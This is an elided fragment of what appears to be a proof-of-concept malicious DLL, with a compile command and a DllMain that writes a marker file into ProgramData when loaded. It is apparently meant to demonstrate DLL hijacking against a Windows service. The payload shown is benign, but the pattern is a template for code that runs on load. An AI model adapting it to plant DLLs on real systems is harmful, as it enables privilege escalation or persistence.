...
// cl.exe /D_USRDLL /D_WINDLL /MT /Tc pged.cpp /link /DLL /out:pged.dll /SUBSYSTEM:WINDOWS /MACHINE:x86
                     ...
                     )
{
	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		...
		HANDLE hFile = CreateFileA("C:\\ProgramData\\Comms\\NETSERVICE_POC.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
